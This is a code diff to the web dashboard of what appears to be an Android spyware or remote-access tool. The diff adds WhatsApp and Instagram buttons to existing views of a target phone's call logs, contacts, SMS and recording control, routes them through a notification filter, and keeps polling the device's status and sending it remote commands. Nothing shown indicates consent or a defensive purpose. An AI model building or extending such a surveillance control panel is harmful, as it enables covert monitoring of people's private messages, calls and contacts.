@@ -126,8 +126,10 @@
             </div>
 
             <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
+            
             <div onclick="openView('whatsapp')" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
             <div onclick="openView('instagram')" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
+            
             <div onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
             <div onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
             <div onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
@@ -151,18 +153,14 @@
 
         function updateDashboard() {
             if (!DEVICE_ID) return;
-            document.getElementById('currentID').innerText = DEVICE_ID;
-
             fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
                     if(data.id) {
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                         document.getElementById('androidVer').innerText = data.version || "--";
-                        
                         const dot = document.getElementById('statusDot');
                         const statusText = document.getElementById('statusText');
-                        
                         if(data.isOnline) {
                             dot.className = "dot online";
                             statusText.innerText = "Connected";
@@ -174,22 +172,22 @@
                             statusText.style.color = "#ff4444";
                             document.getElementById('networkType').innerText = "Offline";
                         }
-
                         const battery = data.battery || 0;
                         document.getElementById('batteryPercent').innerText = battery + "%";
                         document.getElementById('batteryFill').style.width = battery + "%";
                         document.getElementById('batteryStatus').innerText = data.charging ? "⚡ Charging..." : "🔋 On Battery";
                     }
-                })
-                .catch(err => console.error("Update Error"));
+                });
         }
 
-        // --- FIXED: ID ko URL ke sath pass karne ka tarika ---
+        // --- UPDATED LOGIC FOR WHATSAPP/INSTA FILTER ---
         function openView(page) {
-            if(!DEVICE_ID) {
-                askID();
+            if(!DEVICE_ID) return askID();
+            
+            if(page === 'whatsapp' || page === 'instagram') {
+                // Ye notification page ko filter ke saath kholega
+                window.location.href = `view_notifications.html?id=${DEVICE_ID}&filter=${page}`;
             } else {
-                // Ab ye camera page ko batayega ki ID kya hai
                 window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
             }
         }
@@ -200,13 +198,6 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log("Sent:", action);
-                const soundBtn = document.getElementById('soundBtn');
-                soundBtn.style.borderColor = "var(--cyan)";
-                setTimeout(() => soundBtn.style.borderColor = "var(--glass-border)", 500);
             });
         }
 
@@ -225,7 +216,6 @@
         }
 
         setInterval(updateDashboard, 5000);
-        
         window.onload = () => {
             if(DEVICE_ID) updateDashboard();
             else askID();
